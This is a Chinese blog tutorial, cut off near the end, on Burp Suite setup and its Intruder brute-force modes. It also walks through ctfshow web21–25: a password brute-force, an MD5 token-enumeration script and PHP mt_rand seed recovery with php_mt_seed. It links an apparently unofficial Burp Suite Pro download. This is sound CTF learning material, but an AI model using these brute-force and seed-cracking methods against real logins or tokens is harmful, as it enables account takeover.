        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间在入门Web方向，发现Burp Suite这款工具的使用频率还是比较高的，所以有必要写一篇使用总结，方便自己遗忘之后回来翻阅查看</p><p>那么首先涉及到的问题就是工具的安装</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="版本问题"><a href="#版本问题" class="headerlink" title="版本问题"></a>版本问题</h3><h4 id="版本号？"><a href="#版本号？" class="headerlink" title="版本号？"></a>版本号？</h4><p>事实上到写下本文的2023年8月为止，Burp Suite仍然在以每个月release3个小版本的速度更新中</p><img src="/posts/3dacd76b5d9a/image-20230809110045715.png" class="" title="image-20230809110045715"><p>那么该如何在如此众多的版本中进行选择呢？</p><p>一般来说选择软件工具时</p><p>使用稍微旧一些的版本，能在网上找到更多教程</p><p>而使用较新一些的版本，能体验到许多新功能</p><p>不过相对Burp Suite这款软件来说，老版本的教程仍然对新版本适用，因为主要功能的ui并没有变化</p><p>我使用的版本是<strong>v2023.6.2</strong>，原因是Burp Suite在2022年之后的版本中内置了浏览器，这样可以免去配置代理的工作。同时这个版本也不会太新，相对来说较为稳定，Bug会少一些。</p><h4 id="社区版or专业版？"><a href="#社区版or专业版？" class="headerlink" title="社区版or专业版？"></a>社区版or专业版？</h4><img src="/posts/3dacd76b5d9a/image-20230809114420747.png" class="" title="image-20230809114420747"><p>官方提供了Community Edition（社区版）和Professional（专业版）两种版本给我们选择</p><p>其实两种版本的软件都拥有我们在做Web题时会用到的模块，而专业版增加的保存功能其实在做CTF题时并没有太大的用处</p><p>所以<strong>两种版本均可选择</strong></p><p>这里我选择的是专业版</p><p>事实上</p><p>在这里我推荐使用英文版，不仅能让你对专业名词更加熟悉，而且在很多情况下，比如线下赛时，官方提供的工具均为英文版，这时用惯了中文版的你就会有点手足无措</p><h3 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h3><p>链接：<a href="https://pan.baidu.com/s/1tUzFVqUhr-_3t3Rqs6YvqQ?pwd=1111">https://pan.baidu.com/s/1tUzFVqUhr-_3t3Rqs6YvqQ?pwd=1111</a><br>提取码：1111 </p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="CA证书下载及导入"><a href="#CA证书下载及导入" class="headerlink" title="CA证书下载及导入"></a>CA证书下载及导入</h3><p>使用Burp Suite做安全测试时，要抓取HTTPS的包的话，是需要有Burp Suite的CA证书的，否则浏览器不支持。</p><p>如果不做配置，则会出现如下图的问题</p><img src="/posts/3dacd76b5d9a/image-20230810130337259.png" class="" title="image-20230810130337259"><p>这里以我使用的<strong>BurpSuitePro_v2023.6.2</strong>版本为例，为BurpSuite的<strong>内置浏览器</strong>配置CA证书</p><p>配置步骤如下：</p><ol><li><p>将Burp Suite的CA证书下载到本地一共有两种方法</p><div class="tabs" id="下载ca证书"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="下载ca证书-1">直接在Burp Suite上导出证书</button></ul><div class="tab-contents"><div class="tab-item-content active" id="下载ca证书-1"><p>点击进入软件的<strong>Proxy</strong>模块，点击<strong>Proxy settings</strong></p><p><img src="/posts/3dacd76b5d9a/image-20230810141255232.png" class="" title="image-20230810141255232"></p><p>点击<strong>Import/export CA certificate</strong>按钮</p><p><img src="/posts/3dacd76b5d9a/image-20230810141343396.png" class="" title="image-20230810141343396"></p><p>勾选 <strong>Certificate in DER format</strong>，点击<strong>Next</strong></p><p><img src="/posts/3dacd76b5d9a/image-20230810141503047.png" class="" title="image-20230810141503047"></p><p>输入<strong>cacert.der</strong>，点击<strong>Next</strong></p><p><img src="/posts/3dacd76b5d9a/image-20230810141633258.png" class="" title="image-20230810141633258"></p><p>此时在Burp Suite 的同级目录下会多出一个刚刚生成的cacert.der 文件</p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></li><li><div class="note primary flat"><p>Burp suite内置的浏览器内核为<strong>Chromium</strong>，为chrome浏览器导入CA证书的步骤与本教程类似</p></div><p>进入内置浏览器的<strong>设置 - 隐私与安全</strong>界面，点击隐私与安全栏下的<strong>安全</strong>按钮</p><img src="/posts/3dacd76b5d9a/image-20230810142503672.png" class="" title="image-20230810142503672"><p>点击高级栏下的<strong>管理设备证书</strong>按钮</p><img src="/posts/3dacd76b5d9a/image-20230810142622806.png" class="" title="image-20230810142622806"><p>在<strong>受信任的根证书颁发机构</strong>栏下导入并安装上一步下载的CA证书</p><img src="/posts/3dacd76b5d9a/image-20230810143540868.png" class="" title="image-20230810143540868"></li></ol><p>此时再次抓包<code>https://www.baidu.com</code>，就可以正常进行了</p><img src="/posts/3dacd76b5d9a/image-20230810143006689.png" class="" title="image-20230810143006689"><h2 id="Intruder爆破模块介绍"><a href="#Intruder爆破模块介绍" class="headerlink" title="Intruder爆破模块介绍"></a>Intruder爆破模块介绍</h2><p>BurpSuite的Intruder是一个高度可配置的<strong>自动化攻击模块。</strong>可以用来爆破用户名或密码，还可以用来当作简单的爬虫使用</p><p>在CTF题中一般在爆破时会用到</p><h3 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h3><h4 id="Postions"><a href="#Postions" class="headerlink" title="Postions"></a>Postions</h4><p>Positions界面主要用于配置<strong>爆破模式</strong>、<strong>Payload的位置</strong></p><div class="note info flat"><p><strong>payload</strong>翻译成中文叫“载荷”。一般指的是在网络通信中传输的有效载荷（Data payload），也可以理解为在某种类型的消息或数据包中携带的实际数据。在计算机网络中，例如在HTTP请求或响应中，payload就是实际的数据部分，而不包括协议头或其他元数据。在加密中，payload也可以指加密算法中的明文部分，即需要被保护的数据。</p><p>一般来说，CTF中的payload也指漏洞利用时，真正在目标系统执行的代码或指令。</p></div><p>其实这里的payload更多可以理解为数据中的<strong>变量</strong>，即字典爆破的参数</p><img src="/posts/3dacd76b5d9a/image-20230906223231207.png" class="" title="image-20230906223231207"><h4 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h4><p>Payloads界面是有关变量payload的具体配置</p><img src="/posts/3dacd76b5d9a/image-20230907102125909.png" class="" title="image-20230907102125909"><p>有关<strong>payload type</strong>的详细介绍可以参考这篇文章：<a href="https://blog.csdn.net/zbj18314469395/article/details/115429675">[Burp Suite完整教程] Intruder Attack type&amp;Payloads – 拥有上千种姿态的攻击模式_软测小生的博客-CSDN博客</a></p><p>但是平时最常用的类型还是<strong>Simple list</strong>，即使用字典进行爆破</p><img src="/posts/3dacd76b5d9a/image-20230907105812665.png" class="" title="image-20230907105812665"><p><strong>Payload processing</strong>的一些常用可选规则如下：</p><div class="table-container"><table><thead><tr><th>规则</th><th>描述</th></tr></thead><tbody><tr><td>Add prefix</td><td>添加一个文字前缀</td></tr><tr><td>Add suffix</td><td>添加一个文字后缀</td></tr><tr><td>Match/replace</td><td>将替换匹配特定正则表达式的有效载荷的任何部位，替换成一个文字字符串</td></tr><tr><td>Substring</td><td>提取有效载荷的子字符串，可以指定开始索引及长度</td></tr><tr><td>Reverse substring</td><td>从后向前获取子字符串</td></tr><tr><td>Modify case</td><td>将payload全转为大写或小写，或者首字母大写及驼峰命名</td></tr><tr><td>Encode</td><td>URL,HTML,Base64和ASCII码等编码规则</td></tr><tr><td>Decode</td><td>URL,HTML,Base64和ASCII码等解码规则</td></tr><tr><td>Hash</td><td>将payload转为其hash值</td></tr></tbody></table></div><h4 id="Resource-pool"><a href="#Resource-pool" class="headerlink" title="Resource pool"></a>Resource pool</h4><p>Resource pool用于<strong>配置爆破时的请求数和延迟</strong>，合理配置可以缓解带宽压力，同时也能防止被目标站点封禁</p><img src="/posts/3dacd76b5d9a/image-20230907112659661.png" class="" title="image-20230907112659661"><h4 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h4><p>这个页面主要是爆破及结果的一些设置</p><p>比较有用的是<strong>Grep - Match</strong>项，可以提前设置一些关键词，结果中与之匹配的报文会被标记出来</p><p>例如做ctf题之前可以在规则中添加<code>flag</code>关键词</p><img src="/posts/3dacd76b5d9a/image-20230907113859579.png" class="" title="image-20230907113859579"><h3 id="爆破模式"><a href="#爆破模式" class="headerlink" title="爆破模式"></a>爆破模式</h3><h4 id="Sniper（狙击手）"><a href="#Sniper（狙击手）" class="headerlink" title="Sniper（狙击手）"></a>Sniper（狙击手）</h4><p>正如名字狙击手一样，Sniper模式<strong>一次只会爆破一个position的</strong>变量，而<strong>其他变量则会显示为变量名</strong>。</p><p>sniper的特点是只需要指定一个Payload Set，但会针对每个变量逐项的替换。</p><p>假设我们设置两个变量<script type="math/tex">username$:$password</script>，payload set设置为 11,22,33</p><p>那么会按以下顺序爆破：</p><div class="note flat"><p>11:password</p><p>22:password</p><p>33:password</p><p>username:11</p><p>username:22</p><p>username:33</p></div><h4 id="Battering-ram（攻城锤）"><a href="#Battering-ram（攻城锤）" class="headerlink" title="Battering ram（攻城锤）"></a>Battering ram（攻城锤）</h4><p>攻城锤模式下所有位置的变量一起变化，且所有变量遍历同一个字典</p><p>假设我们设置两个变量<script type="math/tex">username$:$password</script>，payload set设置为 11,22,33</p><p>那么会按以下顺序爆破：</p><div class="note flat"><p>11:11</p><p>22:22</p><p>33:33</p></div><h4 id="Pitchforck（草叉模式）"><a href="#Pitchforck（草叉模式）" class="headerlink" title="Pitchforck（草叉模式）"></a>Pitchforck（草叉模式）</h4><p>Pitchfork的特点是多个字典同时进行</p><p>每个变量要有自己的字典文件，也就是说每个变量有一个属于自己的Payload set，但是要注意的是每个Payload set里面的payload个数要一样。</p><p>假设我们设置两个变量<script type="math/tex">username$:$password</script>，payload set1设置为 11,22,33，payload set2设置为 aa,bb,cc</p><p>那么会按以下顺序爆破：</p><div class="note flat"><p>11:aa</p><p>22:bb</p><p>33:cc</p></div><h4 id="Cluster-bomb（集束炸弹）"><a href="#Cluster-bomb（集束炸弹）" class="headerlink" title="Cluster bomb（集束炸弹）"></a>Cluster bomb（集束炸弹）</h4><p>集束炸弹模式是<strong>最常用</strong>的，因为请求报文中需要爆破的变量一般很少会是相同的</p><p>该模式下每个变量对应一个字典，并且进行交集破解，尝试各种组合。</p><p>爆破的顺序则是循环遍历每个payload set2</p><p>假设我们设置两个变量<script type="math/tex">username$:$password</script>，payload set1设置为 11,22,33，payload set2设置为 aa,bb,cc</p><p>那么会按以下顺序爆破：</p><div class="note flat"><p>11:aa</p><p>11:bb</p><p>11:cc</p><p>22:aa</p><p>22:bb</p><p>22:cc</p><p>33:aa</p><p>33:bb</p><p>33:cc</p></div><h2 id="ctfshow-web21-28"><a href="#ctfshow-web21-28" class="headerlink" title="ctfshow web21-28"></a>ctfshow web21-28</h2><h3 id="web21（用户名密码爆破）"><a href="#web21（用户名密码爆破）" class="headerlink" title="web21（用户名密码爆破）"></a>web21（用户名密码爆破）</h3><p>打开目标站点后发现需要登录</p><img src="/posts/3dacd76b5d9a/image-20230906214905325.png" class="" title="image-20230906214905325"><p>将题目给的字典附件下载到本地</p><img src="/posts/3dacd76b5d9a/image-20230906221437210.png" class="" title="image-20230906221437210"><p>既然给了字典，那么自然而然就能想到要用爆破的方法</p><p>这里使用<strong>burp suite</strong>自带的<strong>Intruder模块</strong></p><p>随便输入一个用户名和密码，发现<code>用户名:密码</code>在请求报文中被base64编码</p><img src="/posts/3dacd76b5d9a/image-20230906221900074.png" class="" title="image-20230906221900074"><p>将请求报文转入Intruder</p><p>用户名和冒号为<code>admin:</code>不变，设置成第一个变量，而密码需要用提供的字典爆破，设置成第二个变量</p><p>所以此时选用<strong>Cluster bomb</strong>模式</p><img src="/posts/3dacd76b5d9a/image-20230907103106657.png" class="" title="image-20230907103106657"><p>接下来设置两个payload变量</p><p>payload1:</p><img src="/posts/3dacd76b5d9a/image-20230907103607814.png" class="" title="image-20230907103607814"><p>payload2:</p><img src="/posts/3dacd76b5d9a/image-20230907103906531.png" class="" title="image-20230907103906531"><p>开始爆破，得到正确的密码，并将报文转入Repeater</p><img src="/posts/3dacd76b5d9a/image-20230907104143492.png" class="" title="image-20230907104143492"><p>得到最终flag</p><img src="/posts/3dacd76b5d9a/image-20230907104226195.png" class="" title="image-20230907104226195"><h3 id="web22（子域名爆破）"><a href="#web22（子域名爆破）" class="headerlink" title="web22（子域名爆破）"></a>web22（子域名爆破）</h3><p>题目提示爆破子域名，使用工具layer进行爆破即可</p><h3 id="web23（源码分析）"><a href="#web23（源码分析）" class="headerlink" title="web23（源码分析）"></a>web23（源码分析）</h3><p>题目给出的源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码得：</p><p>flag的md5值的<strong>（第2位+第15位+第18位）/第2位=第32位</strong></p><p>使用以下脚本进行爆破：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">62</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$b</span> = <span class="number">0</span>; <span class="variable">$b</span> &lt; <span class="number">62</span>; <span class="variable">$b</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$c</span> = <span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="number">62</span>; <span class="variable">$c</span>++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="variable">$string</span>[<span class="variable">$a</span>] . <span class="variable">$string</span>[<span class="variable">$b</span>] . <span class="variable">$string</span>[<span class="variable">$c</span>];</span><br><span class="line">            <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>) === <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>)) + <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>, <span class="number">1</span>)) + <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>, <span class="number">1</span>)) / <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>, <span class="number">1</span>) === <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便选一个爆破后的结果作为tocen即可</p><img src="/posts/3dacd76b5d9a/image-20230907191246896.png" class="" title="image-20230907191246896"><img src="/posts/3dacd76b5d9a/image-20230907191659736.png" class="" title="image-20230907191659736"><h3 id="web24（伪随机数）"><a href="#web24（伪随机数）" class="headerlink" title="web24（伪随机数）"></a>web24（伪随机数）</h3><p>题目给出的源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">148</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">112</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">1</span>)) <span class="comment">#165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 Linux version 5.4.0-148-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023</span></span><br></pre></td></tr></table></figure><p>这里考到一个知识点，即<strong>mt_srand()函数</strong></p><p>mt_scrand(seed)用于分发seed种子。指定seed后，使用mt_rand()生成的随机数为固定值，或者称为<strong>伪随机数</strong></p><div class="note warning flat"><p>自 PHP 4.2.0 起，不再需要用 srand()或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</p><p>如指定seed，则生成的是伪随机数</p></div><p>编写php脚本得到r的值</p><img src="/posts/3dacd76b5d9a/image-20230908004820002.png" class="" title="image-20230908004820002"><img src="/posts/3dacd76b5d9a/image-20230908004947414.png" class="" title="image-20230908004947414"><h3 id="web25（伪随机数爆破）"><a href="#web25（伪随机数爆破）" class="headerlink" title="web25（伪随机数爆破）"></a>web25（伪随机数爆破）</h3><p>题目给出的源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">148</span>-<span class="title function_ invoke__">generic</span> (buildd@lcy02-amd64-<span class="number">112</span>) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">1</span>)) <span class="comment">#165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 Linux version 5.4.0-148-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023</span></span><br></pre></td></tr></table></figure><p>get请求的<code>$r</code>以及输出的<code>$rand</code>能让我们确定该种子生成的第一个随机数的值，后面两个随机数则能通过<strong>php_mt_seed</strong>爆破种子来确定</p><div class="note info flat"><p>在python中，存在<strong>MT19937攻击</strong>，同样，php中也能利用梅森旋转算法的特性，从生成的随机数反推随机数种子</p><p>这里用到工具<strong>php_mt_seed</strong>，事实上这个工具并不需要投喂624个32位的数据，因为php中生成的随机数位数较小</p><p>它的原理其实是<strong>穷举所有的种子</strong>并根据枚举出的种子生成随机数序列再跟已知的随机数序列做比对来验证种子是否正确</p><p>工具下载链接：<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand（） 种子饼干 (openwall.com)</a></p><p>安装指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在php_mt_seed-4.0/ 目录下</span></span><br><span class="line">make</span><br><span class="line">gcc -Wall -march=native -mtune=generic -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed</span><br></pre></td></tr></table></figure><p><div class="note warning flat"><p>该工具需安装在linux环境下运行</p></div></p><p>用法：<code>./php_mt_seed.c 随机数</code></p></div><p>先通过get请求测试r=100</p><img 